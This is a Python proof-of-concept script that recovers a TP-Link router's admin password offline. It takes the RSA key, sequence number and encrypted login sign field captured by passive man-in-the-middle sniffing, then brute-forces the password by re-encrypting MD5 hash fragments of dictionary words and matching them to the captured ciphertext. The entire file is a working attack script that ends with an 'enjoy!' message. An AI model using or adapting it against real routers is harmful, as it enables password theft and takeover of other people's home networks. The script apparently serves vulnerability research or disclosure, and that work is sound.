import binascii
import hashlib

import tp_link_crypto


USERNAME = "admin"  # Hardcoded in the router


def main():
    # Replace with rockyou.txt or any other password dump
    password_dictionary = ["password", "123456", "password123"]

    # Fields the attacker knows from the `/cgi/getParm` request during passive MitM
    e = 0x10001
    n = 0xD1360056D6090AF5987BCD20FB6979279C7BDEF84D465EFEDE5BC0481D80A2B6980F78396567853B369DE1369E7E055C73740AFD9EAD337548E493340150F36B  # noqa
    seq = 271058633

    # The attacker can derive this value from the length of the data field in the `/cgi_gdpr` request that follows the
    # `/cgi/getParm` request
    data_len = 59

    # This is what the s field is set to in the `/cgi_gdpr` request's sign field
    seq_plus_data_len = seq + data_len

    # This is the RSA encrypted sign field of a `/cgi_gdpr` request. The decrypted contents of this sign field:
    # "key=1617857002547232&iv=1617857002547416&h=bb0f7e021d52a4e31613d463fc0525d8&s=271058692"
    ciphertext_hex_str = "1311e8009b3f52a4e3a74766a46ab1fda759914d72c214522c06d8174a14018ebb67689b1f5ded765bba3b33897" \
                         "c6fdfcca0ca06ebfafb510918b602c0036a99835a92669370909836c3edb33b9c6f140e4e863b18bd269fcdfec9" \
                         "25ff1ee2e3df449fcc296483088c2209aab1b23d1e8ff9211079986d67a64cb24395cc7c03"
    assert len(ciphertext_hex_str) == 256, "Expected login sign field to be 128 bytes"
    # Get the second half of the message
    ciphertext = binascii.a2b_hex(ciphertext_hex_str[128:])

    attempt = 0
    for password in password_dictionary:
        attempt += 1
        # Only 44 bits or our 128 bit MD5 hash are in the second RSA block. In our example plaintext, it's just the
        # "463fc0525d8&s=271058692" section of the plaintext. The s (sequence) field is known to the attacker, so we're
        # only guessing the password. If the ciphertext of our offline hash attempt matches the ciphertext of the sign
        # field, we probably found the password!
        hash_attempt = hashlib.md5(f"{USERNAME}{password}".encode()).digest().hex()
        # Attempt to match it with the last 44 bits of the hash
        hash_attempt = hash_attempt[-11:]
        crack_attempt_input = f"{hash_attempt}&s={seq_plus_data_len}"
        crack_attempt_output = tp_link_crypto.rsa_encrypt(e, n, crack_attempt_input.encode())
        if crack_attempt_output == ciphertext:
            print(f"Cracked the password after {attempt} attempts. The password is \"{password}\", enjoy!")


if __name__ == "__main__":
    main()
